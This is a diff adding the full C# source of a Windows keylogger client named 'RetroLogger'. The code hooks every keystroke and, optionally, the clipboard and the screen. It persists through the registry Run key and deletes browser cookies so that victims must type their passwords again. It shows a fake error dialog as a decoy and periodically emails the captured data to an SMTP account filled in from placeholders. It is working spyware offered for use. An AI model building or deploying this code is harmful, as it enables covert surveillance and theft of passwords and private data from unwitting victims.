@@ -1,0 +1,460 @@
+using Microsoft.Win32;
+using System;
+using System.Collections.Generic;
+using System.Drawing;
+using System.Drawing.Imaging;
+using System.IO;
+using System.Linq;
+using System.Net;
+using System.Net.Mail;
+using System.Reflection;
+using System.Runtime.InteropServices;
+using System.Threading;
+using System.Threading.Tasks;
+using System.Windows.Forms;
+
+namespace RetroLogger_Client
+{
+    static class Program
+    {
+        private static string _username = "%USERNAME%";
+        private static string _password = "%PASSWORD%";
+        private static string _smtp = "%SMTP%";
+        private static int _port = 25;
+        private static int _interval = 1800000;
+        private static bool _addToStartup = false;
+        private static bool _deleteCookies = false;
+        private static bool _showError = false;
+        private static bool _logClipboard = false;
+        private static bool _takeScreenshot = false;
+        private static AutoResetEvent _waiter = new AutoResetEvent(false);
+
+        private static string _keyLog = "<!DOCTYPE HTML>\n<html>\n<head></head>\n<body>\n";
+        private static string _clipLog = string.Empty;
+
+        private static Keyboard _kbHook = null;
+        private static Clipboard _cbHook = null;
+
+        /// <summary>
+        /// The main entry point for the application.
+        /// </summary>
+        [STAThread]
+        static void Main()
+        {
+            _kbHook = new Keyboard();
+            _kbHook.KeyDown += _kbHook_KeyDown;
+            _kbHook.hook();
+
+            if (_logClipboard)
+            {
+                _cbHook = new Clipboard();
+                _cbHook.ChangedEvent += _cbHook_ChangedEvent;
+                _cbHook.install();
+            }
+
+            if (_addToStartup)
+                addToStartup();
+
+            if (_deleteCookies)
+                deleteCookies();
+
+            if (_showError)
+                showError();
+
+            interval();
+        }
+
+        private static void addToStartup()
+        {
+            Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run", true).SetValue("RetroLogger", Application.ExecutablePath);
+        }
+
+        private static void deleteCookies()
+        {
+            deleteIE();
+            deleteChrome();
+            deleteFirefox();
+        }
+
+        private static void deleteIE()
+        {
+            object readData = Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Explorer\User Shell Folders\").GetValue("Cookies");
+
+            if (readData != null)
+            {
+                string cookiePath = Environment.ExpandEnvironmentVariables(readData.ToString());
+
+                foreach (string file in Directory.GetFiles(cookiePath))
+                {
+                    try
+                    {
+                        File.Delete(file);
+                    }
+                    catch { }
+                }
+            }
+        }
+
+        private static void deleteChrome()
+        {
+            string cookiePath = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData) + @"\Google\Chrome\UserData\Default\Cookies";
+
+            if (File.Exists(cookiePath))
+            {
+                try
+                {
+                    File.Delete(cookiePath);
+                }
+                catch { }
+            }
+        }
+
+        private static void deleteFirefox()
+        {
+            string cookiePath = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + @"\Mozilla\Firefox\Profiles";
+
+            foreach (string proFolder in Directory.GetDirectories(cookiePath))
+            {
+                foreach (string file in Directory.GetFiles(proFolder))
+                {
+                    string filename = Path.GetFileName(file);
+
+                    if (filename == "cookies.sqlite" || filename == "permissions.sqlite" || filename == "cookies.txt")
+                    {
+                        try
+                        {
+                            File.Delete(file);
+                        }
+                        catch { }
+                    }
+                }
+            }
+        }
+
+        private static void showError()
+        {
+            Thread t = new Thread(() =>
+                {
+                    MessageBox.Show("The application failed to initialize properly (0xc0000135). Click on OK to terminate the application.", Path.GetFileName(Application.ExecutablePath) + " - Application Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                });
+
+            t.SetApartmentState(ApartmentState.STA);
+            t.IsBackground = true;
+            t.Start();
+        }
+
+        private static Image getScreen()
+        {
+            Rectangle bounds = Screen.PrimaryScreen.Bounds;
+            Bitmap screen = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
+            Graphics g = Graphics.FromImage(screen);
+
+            g.CopyFromScreen(bounds.X, bounds.Y, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
+
+            return screen;
+        }
+
+        private static string getTimeName()
+        {
+            return DateTime.Now.ToString().Replace("/", string.Empty).Replace(":", string.Empty).Replace(" ", "_");
+        }
+
+        private static void interval()
+        {
+            Thread t = new Thread(() =>
+            {
+                string toSend;
+
+                while (true)
+                {
+                    _waiter.WaitOne(_interval);
+
+                    lock (_keyLog)
+                    {
+                        toSend = _keyLog + "\n</body>\n</html>";
+                        _keyLog = "<!DOCTYPE HTML>\n<html>\n<head></head>\n<body>\n";
+                    }
+
+                    using (MailMessage mail = new MailMessage())
+                    {
+                        mail.Subject = "RetroLogger";
+                        mail.To.Add(_username);
+                        mail.From = new MailAddress(_username);
+                        mail.IsBodyHtml = true;
+                        mail.Body = toSend;
+
+                        if (_takeScreenshot)
+                        {
+                            string imagePath = Path.GetTempPath() + "Screenshot_" + getTimeName() + ".jpeg";
+
+                            getScreen().Save(imagePath);
+                            mail.Attachments.Add(new Attachment(imagePath));
+                        }
+
+                        if (_logClipboard)
+                        {
+                            string clipPath = Path.GetTempPath() + "Clipboard_" + getTimeName() + ".txt";
+
+                            lock (_clipLog)
+                            {
+                                File.WriteAllText(clipPath, _clipLog);
+                                _clipLog = string.Empty;
+                            }
+
+                            mail.Attachments.Add(new Attachment(clipPath));
+                        }
+
+                        using (SmtpClient smtp = new SmtpClient(_smtp))
+                        {
+                            smtp.EnableSsl = true;
+                            smtp.Credentials = new NetworkCredential(_username, _password);
+                            smtp.Port = _port;
+                            smtp.Send(mail);
+                        }
+                    }
+                }
+            });
+
+            t.SetApartmentState(ApartmentState.STA);
+            t.Start();
+        }
+
+        private static void _kbHook_KeyDown(string key)
+        {
+            lock (_keyLog)
+                _keyLog += key;
+        }
+
+        private static void _cbHook_ChangedEvent()
+        {
+            lock (_clipLog)
+                _clipLog += "[--------------------" + DateTime.Now.ToString() + "--------------------]" + Environment.NewLine + System.Windows.Forms.Clipboard.GetText() + Environment.NewLine + Environment.NewLine;
+        }
+    }
+
+    public class Keyboard
+    {
+        [StructLayout(LayoutKind.Sequential)]
+        public class KeyStruct
+        {
+            public uint vkCode;
+            public uint scanCode;
+            public uint flags;
+            public uint time;
+            public UIntPtr dwExtraInfo;
+        }
+
+        private int _key;
+        private HookProc _hook;
+
+        public delegate void OnKey(string key);
+        public event OnKey KeyUp;
+        public event OnKey KeyDown;
+
+        public delegate int HookProc(int code, int wParam, KeyStruct lParam);
+
+        [DllImport("user32.dll")]
+        public static extern int SetWindowsHookEx(int hookType, HookProc lpfn, int hMod, int dwThreadId);
+
+        [DllImport("user32.dll")]
+        public static extern int CallNextHookEx(int hhk, int nCode, int wParam, KeyStruct lParam);
+
+        [DllImport("user32.dll")]
+        public static extern bool UnhookWindowsHookEx(int hhk);
+
+        public Keyboard()
+        {
+            _hook = proc;
+        }
+
+        public void hook()  
+        {
+            _key = SetWindowsHookEx(13, _hook, Marshal.GetHINSTANCE(Assembly.GetExecutingAssembly().GetModules()[0]).ToInt32(), 0);
+        }
+
+        public void unhook()
+        {
+            UnhookWindowsHookEx(_key);
+        }
+
+        private int proc(int code, int wParam, KeyStruct lParam)
+        {
+            if (code == 0)
+            {
+                switch (wParam)
+                {
+                    case 0x100:
+                    case 0x104:
+                        if (KeyDown != null)
+                            KeyDown(convert((Keys)lParam.vkCode));
+                        break;
+                    case 0x101:
+                    case 0x105:
+                        if (KeyUp != null)
+                            KeyUp(convert((Keys)lParam.vkCode));
+                        break;
+                }
+            }
+
+            return CallNextHookEx(_key, code, wParam, lParam);
+        }
+
+        private string convert(Keys k)
+        {
+            int keyVal = (int)k;
+
+            if (keyVal == 32)
+            {
+                return " ";
+            }
+            else if (keyVal >= 48 && keyVal <= 57)
+            {
+                if ((Control.ModifierKeys & Keys.Shift) != 0)
+                {
+                    switch (k.ToString())
+                    {
+                        case "D1": return "!";
+                        case "D2": return "@";
+                        case "D3": return "#";
+                        case "D4": return "$";
+                        case "D5": return "%";
+                        case "D6": return "^";
+                        case "D7": return "&";
+                        case "D8": return "*";
+                        case "D9": return "(";
+                        case "D0": return ")";
+                    }
+                }
+
+                return k.ToString().Replace("D", string.Empty);
+            }
+            else if (keyVal >= 65 && keyVal <= 90)
+            {
+                if (Control.IsKeyLocked(Keys.CapsLock) || (Control.ModifierKeys & Keys.Shift) != 0)
+                    return k.ToString();
+
+                return k.ToString().ToLower();
+            }
+            else if (keyVal >= 96 && keyVal <= 105)
+            {
+                return k.ToString().Replace("NumPad", string.Empty);
+            }
+            else if (keyVal >= 106 && keyVal <= 111)
+            {
+                switch (k.ToString())
+                {
+                    case "Divide": return "/";
+                    case "Multiply": return "*";
+                    case "Subtract": return "-";
+                    case "Add": return "+";
+                    case "Decimal": return ".";
+                }
+            }
+            else if (keyVal >= 186 && keyVal <= 222)
+            {
+                if ((Control.ModifierKeys & Keys.Shift) != 0)
+                {
+                    switch (k.ToString())
+                    {
+                        case "OemMinus": return "_";
+                        case "Oemplus": return "+";
+                        case "OemOpenBrackets": return "{";
+                        case "Oem6": return "}";
+                        case "Oem5": return "|";
+                        case "Oem1": return ":";
+                        case "Oem7": return "\"";
+                        case "Oemcomma": return "<";
+                        case "OemPeriod": return ">";
+                        case "OemQuestion": return "?";
+                        case "Oemtilde": return "~";
+                    }
+                }
+                else
+                {
+                    switch (k.ToString())
+                    {
+                        case "OemMinus": return "-";
+                        case "Oemplus": return "=";
+                        case "OemOpenBrackets": return "[";
+                        case "Oem6": return "]";
+                        case "Oem5": return @"\";
+                        case "Oem1": return ";";
+                        case "Oem7": return "'";
+                        case "Oemcomma": return ",";
+                        case "OemPeriod": return ".";
+                        case "OemQuestion": return "/";
+                        case "Oemtilde": return "`";
+                    }
+                }
+            }
+            else if (keyVal >= 160 && keyVal <= 161)
+            { }
+            else if (k == Keys.Return)
+            {
+                return "<br>";
+            }
+
+            return "<span style=\"background-color:yellow;\">[" + k.ToString() + "]</span>";
+        }
+    }
+
+    public class Clipboard : NativeWindow
+    {
+        IntPtr _hwnd;
+
+        public delegate void Changed();
+        public event Changed ChangedEvent;
+
+        [DllImport("User32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr SetClipboardViewer(IntPtr hWndNewViewer);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern bool ChangeClipboardChain(IntPtr hWndRemove, IntPtr hWndNewNext);
+
+        [DllImport("user32.dll", CharSet = CharSet.Auto)]
+        public static extern IntPtr SendMessage(IntPtr hWnd, UInt32 Msg, IntPtr wParam, IntPtr lParam);
+
+        public Clipboard()
+        {
+            CreateHandle(new CreateParams());
+        }
+
+        ~Clipboard()
+        {
+            uninstall();
+        }
+
+        public void install()
+        {
+            _hwnd = SetClipboardViewer(Handle);
+        }
+
+        public void uninstall()
+        {
+            ChangeClipboardChain(Handle, _hwnd);
+        }
+
+        protected override void WndProc(ref Message m)
+        {
+            switch (m.Msg)
+            {
+                case 776:
+                    if (ChangedEvent != null)
+                        ChangedEvent();
+
+                    SendMessage(_hwnd, (uint)m.Msg, m.WParam, m.LParam);
+
+                    break;
+                case 781:
+                    if (m.WParam == _hwnd)
+                        _hwnd = m.LParam;
+                    else
+                        SendMessage(_hwnd, (uint)m.Msg, m.WParam, m.LParam);
+
+                    break;
+            }
+
+            base.WndProc(ref m);
+        }
+    }
+}
